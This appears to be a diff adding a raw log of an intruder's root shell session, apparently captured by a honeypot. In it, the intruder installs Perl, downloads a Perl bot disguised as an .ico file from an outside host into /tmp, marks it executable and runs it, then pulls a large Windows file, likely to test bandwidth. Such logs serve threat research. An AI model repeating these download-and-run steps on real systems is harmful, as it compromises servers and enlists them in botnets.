@@ -1,0 +1,84 @@
+[4hAWSWeb:~# w
+[4l 10:31:57 up 37 days, 12:35,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    94.187.93.163     10:31    0.09   0.05   0.05 w
+[4hAWSWeb:~# ls -a
+[4l.         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
+[4hAWSWeb:~# wget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hAWSWeb:~# perl
+bash: perl: command not found
+AWSWeb:~# yum install perl*
+bash: yum: command not found
+AWSWeb:~# p[1D[1Papt-get install perl*
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 166.2kB of archives.
+After this operation, 365.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 0.20-9 [166.2kB]
+Fetched 166.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_0.20-9_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (0.20-9) ...
+[4hAWSWeb:~# cd
+[4l[4hAWSWeb:~# cd /tmp
+[4l[4hAWSWeb:/tmp# ls -a
+[4l.         ..        .ICE-unix .X11-unix 
+[4hAWSWeb:/tmp# wget http://bat.ucoz.ro/Linux/PerlBoT/fafic.ico
+[4l--2013-03-03 10:32:56--  http://bat.ucoz.ro/Linux/PerlBoT/fafic.ico
+Connecting to bat.ucoz.ro:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 40359 (39K) [image/x-icon]
+Saving to: `fafic.ico
+
+ 3% [=>                                     ] 1,448        3K/s  eta 11s64% [=========================>             ] 26,064       27K/s  eta 0s100%[======================================>] 40,359       27K/s
+
+2013-03-03 10:32:57 (27 KB/s) - `fafic.ico' saved [40359/40359]
+[4hAWSWeb:/tmp# perl [1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pchmod +x *
+[4l[4hAWSWeb:/tmp# perl fafic.ico
+[4lperl: Segmentation fault
+[4hAWSWeb:/tmp# wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
+[4l--2013-03-03 10:33:45--  http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
+Connecting to download.microsoft.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 130978672 (124M) [application/octet-stream]
+Saving to: `W2Ksp3.exe
+
+ 0% [>                                      ] 2,499        7K/s  eta 4h 33m 29s 2% [>                                      ] 3,148,222    3836K/s  eta 33s     6% [==>                                    ] 8,142,487    6141K/s  eta 20s12% [====>                                  ] 15,738,776   8517K/s  eta 13s17% [======>                                ] 23,068,672   9822K/s  eta 10s21% [========>                              ] 28,330,469   9847K/s  eta 10s25% [=========>                             ] 33,559,861   9923K/s  eta 9s ^C
+200 OK
+[4hAWSWeb:/tmp# wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
+[4l--2013-03-03 10:33:50--  http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
+Connecting to download.microsoft.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 130978672 (124M) [application/octet-stream]
+Saving to: `W2Ksp3.exe
+
+ 0% [>                                      ] 5,495        19K/s  eta 1h 49m 29s 1% [>                                      ] 1,833,143    2284K/s  eta 56s      2% [>                                      ] 3,164,647    2392K/s  eta 53s 3% [=>                                     ] 4,977,423    2680K/s  eta 47s 4% [=>                                     ] 6,310,375    2643K/s  eta 47s^C
+200 OK
+[4hAWSWeb:/tmp# ls -a
+[4l.         ..        .ICE-unix .X11-unix fafic.ico 
+[4hAWSWeb:/tmp# ls -all
+[4ldrwxr-xr-x 1 root root  4096 2013-03-03 10:40 .
+drwxr-xr-x 1 root root  4096 2013-03-03 10:40 ..
+drwxrwxrwx 1 root root  4096 2009-11-20 08:19 .ICE-unix
+drwxrwxrwx 1 root root  4096 2009-11-20 08:19 .X11-unix
+-rw-r--r-- 1 root root 40359 2013-03-03 10:32 fafic.ico
+[4hAWSWeb:/tmp# ps -ef
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps -ef
+[4hAWSWeb:/tmp# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:/tmp# 
